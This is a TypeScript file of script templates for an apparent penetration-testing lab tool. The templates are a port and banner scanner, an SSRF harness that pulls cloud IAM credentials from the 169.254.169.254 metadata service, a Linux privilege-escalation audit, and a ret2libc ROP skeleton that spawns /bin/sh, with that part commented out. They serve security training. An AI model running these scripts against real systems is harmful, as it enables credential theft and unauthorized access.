import { ScriptTemplate } from '../types';

export const INITIAL_SCRIPT_TEMPLATES: ScriptTemplate[] = [
  {
    id: 'script-async-scanner',
    title: 'Async TCP Port & Service Fingerprinter',
    language: 'python',
    category: 'recon',
    description: 'High-speed asynchronous socket scanner with protocol banner grabber and zero external libraries.',
    code: `#!/usr/bin/env python3
"""
AegisSec Lab: Asynchronous TCP Port & Service Fingerprinter
Authorized Scope: target-lab.internal, 192.168.56.0/24
"""
import asyncio
import socket
import sys

TARGET_PORTS = [21, 22, 23, 25, 53, 80, 111, 139, 443, 445, 1433, 3306, 3389, 5432, 8080, 8443]

async def check_port(target: str, port: int, timeout: float = 1.2):
    try:
        conn = asyncio.open_connection(target, port)
        reader, writer = await asyncio.wait_for(conn, timeout=timeout)
        banner = ""
        try:
            writer.write(b"HEAD / HTTP/1.0\\r\\n\\r\\n")
            await writer.drain()
            raw = await asyncio.wait_for(reader.read(256), timeout=0.8)
            banner = raw.decode('utf-8', errors='ignore').split('\\n')[0].strip()
        except Exception:
            pass
        writer.close()
        await writer.wait_closed()
        return port, True, banner
    except Exception:
        return port, False, ""

async def run_scan(target_ip: str):
    print(f"[*] Commencing stealth reconnaissance on target: {target_ip}")
    tasks = [check_port(target_ip, p) for p in TARGET_PORTS]
    results = await asyncio.gather(*tasks)
    
    print("\\n[+] Open Port Summary:")
    print("-" * 50)
    for port, is_open, banner in results:
        if is_open:
            banner_info = f" -> {banner[:35]}" if banner else ""
            print(f"    Port {port:5d}/TCP [OPEN]{banner_info}")

if __name__ == "__main__":
    ip = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    asyncio.run(run_scan(ip))
`
  },
  {
    id: 'script-ssrf-imdsv2',
    title: 'SSRF Cloud IMDSv2 Token & Credential Extractor',
    language: 'python',
    category: 'exploit_poc',
    description: 'Automated test harness for IMDSv1/v2 SSRF vulnerabilities with header rotation and IP obfuscation.',
    code: `#!/usr/bin/env python3
"""
AegisSec Lab: Cloud IMDSv1/IMDSv2 Extraction Test Harness
Authorized Scope: target-lab.internal
"""
import requests
import sys

def test_imdsv1(ssrf_proxy_url):
    print("[*] Probing IMDSv1 endpoint (169.254.169.254)...")
    target = f"{ssrf_proxy_url}?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    try:
        res = requests.get(target, timeout=4)
        if res.status_code == 200 and len(res.text.strip()) > 0:
            print(f"[!] IMDSv1 Exposed! Roles: {res.text.strip()}")
            return True
    except Exception as e:
        print(f"[-] IMDSv1 test failed: {e}")
    return False

def test_imdsv2_session(ssrf_proxy_url):
    print("[*] Probing IMDSv2 Token Generation...")
    # Requires PUT request forwarding with TTL header
    headers = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
    target = f"{ssrf_proxy_url}?url=http://169.254.169.254/latest/api/token"
    try:
        res = requests.put(target, headers=headers, timeout=4)
        if res.status_code == 200:
            print(f"[+] IMDSv2 Token successfully obtained: {res.text[:20]}...")
            return res.text
    except Exception as e:
        print(f"[-] IMDSv2 requires specialized header forwarding: {e}")
    return None

if __name__ == "__main__":
    proxy_endpoint = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/vulnerable_endpoint"
    test_imdsv1(proxy_endpoint)
`
  },
  {
    id: 'script-posix-privesc',
    title: 'Linux POSIX Privilege Escalation Audit',
    language: 'bash',
    category: 'privesc',
    description: 'Zero-footprint POSIX shell script to discover writable SUID, GTFOBins, and unprivileged user namespaces.',
    code: `#!/bin/sh
# AegisSec Lab: Zero-Footprint Host Privilege Escalation Scanner
# Strict RoE Authorized Scope: Local Lab Instance

echo "======================================================"
echo " AegisSec Host Privilege Escalation Quick-Audit"
echo " Host: $(hostname) | Kernel: $(uname -r) | UID: $(id -u)"
echo "======================================================"

echo "\\n[*] 1. Inspecting SUID/SGID Binaries with GTFOBins Potential..."
find / -perm -4000 -type f 2>/dev/null | grep -E "(python|bash|sh|find|vim|nmap|pkexec|cp|base64|gdb|perl|tar)" | while read -r line; do
    echo "  [!] POTENTIAL GTFOBINS: $line"
done

echo "\\n[*] 2. Checking Dangerous File Capabilities..."
if command -v getcap >/dev/null 2>&1; then
    getcap -r / 2>/dev/null | grep -E "(cap_setuid|cap_dac_override|cap_sys_admin)"
else
    echo "  [-] getcap binary not found."
fi

echo "\\n[*] 3. Checking Sudo Rights..."
sudo -l 2>/dev/null || echo "  [-] Sudo requires interactive password."

echo "\\n[*] 4. Checking Unprivileged User Namespace Clone (Kernel Exploit Surface)..."
if [ -f /proc/sys/kernel/unprivileged_userns_clone ]; then
    VAL=$(cat /proc/sys/kernel/unprivileged_userns_clone)
    echo "  unprivileged_userns_clone = $VAL (1 = allows sandbox escape vectors like nf_tables)"
fi
`
  },
  {
    id: 'script-rop-skeleton',
    title: 'x86_64 ROP Chain & Ret2libc Exploit Skeleton',
    language: 'python',
    category: 'exploit_poc',
    description: 'Pwntools template for bypassing ASLR/NX via puts/printf address leak and system(/bin/sh) calculation.',
    code: `#!/usr/bin/env python3
"""
AegisSec Lab: x86_64 Pwntools Ret2libc / ROP Skeleton
Authorized Scope: Local CTF / Lab Binary
"""
from pwn import *

# Set binary context
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

binary_path = './vuln_binary'
# elf = ELF(binary_path)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def start():
    if args.REMOTE:
        return remote('127.0.0.1', 9999)
    else:
        return process(binary_path)

def exploit():
    p = start()
    
    # 1. Overflow offset to RIP
    offset = 72
    pop_rdi = 0x4011d3  # pop rdi; ret
    ret = 0x40101a      # ret (for 16-byte stack alignment)
    
    # 2. Stage 1: Leak libc address via puts(puts@got)
    # rop1 = flat([
    #     b'A' * offset,
    #     pop_rdi,
    #     elf.got['puts'],
    #     elf.plt['puts'],
    #     elf.symbols['main']
    # ])
    # p.sendline(rop1)
    # leaked_puts = u64(p.recvline().strip().ljust(8, b'\\x00'))
    # libc.address = leaked_puts - libc.symbols['puts']
    # log.success(f"Libc base: {hex(libc.address)}")

    # 3. Stage 2: Return to system('/bin/sh')
    # bin_sh = next(libc.search(b'/bin/sh'))
    # rop2 = flat([
    #     b'A' * offset,
    #     ret,
    #     pop_rdi,
    #     bin_sh,
    #     libc.symbols['system']
    # ])
    # p.sendline(rop2)
    # p.interactive()
    print("[*] ROP skeleton loaded. Configure gadget addresses from ROPgadget --binary ./target")

if __name__ == '__main__':
    exploit()
`
  }
];
